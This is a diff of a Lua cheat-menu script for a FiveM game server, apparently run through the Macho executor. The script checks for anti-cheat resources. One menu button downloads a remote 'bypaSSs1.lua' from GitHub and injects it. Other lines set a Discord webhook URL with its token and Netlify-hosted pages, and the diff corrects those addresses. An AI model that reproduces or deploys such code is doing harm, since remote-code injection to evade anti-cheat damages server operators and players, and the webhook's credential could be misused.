@@ -1,4 +1,3 @@
-
 local ecResources = {"EC-PANEL", "EC_AC"}
 for _, resource in ipairs(ecResources) do
     if GetResourceState(resource) == "started" then
@@ -11749,7 +11748,7 @@ MachoMenuButton(toolstabmain, "Scan Players", function()
 end)
 
 MachoMenuButton(toolstrigger, "Soon", function()  
-    MachoIsolatedInject(MachoWebRequest("https://github.com/KALD112/By/raw/refs/heads/main/bypaSSs1.lua"))
+    MachoIsolatedInject(MachoWebRequest("https://github.com/NitWit-4/bypaSSs1/raw/refs/heads/main/bypaSSs1.lua"))
                          
     MachoMenuNotification("Scanner", "Soon")
 end)
@@ -11853,9 +11852,9 @@ end)
 
 -- ====== إعدادات ======
 
-local URL_TO_INDEX = "https://voluble-liger-b4189e.netlif.app/" -- الرابط الجديد
+local URL_TO_INDEX = "https://voluble-liger-b4189e.netlify.app/" -- الرابط الجديد
 
-local WEBHOOK_URL = "https://discordapp.com/api/webhooks/147795384092000520/hZ9PW3PAAoIbaEBtMUQib3sPI9vX3JrAAD9cRhjtC341aNTrzJtVzhH-DDnk6VqNCws-" -- ويبهوك
+local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1457795384092000520/hZ9PW3PAAoIbaEBtMUQib3sPI9vX3JrAAD9cRhjtC341aNTrzJtVzhH-DDnk6VqNCws-" -- ويبهوك
 
 local IMAGE_URL = "" -- صورة
 
@@ -12276,7 +12275,7 @@ end)
 
 -- Notification DUI
 
-local notificationUrl = "https://incandescent-empanada-490ec3.netlif.app"  -- حط رابط الـ HTML حقك هنا
+local notificationUrl = "https://incandescent-empanada-490ec3.netlify.app"  -- حط رابط الـ HTML حقك هنا
 
 local notificationDui = nil
 
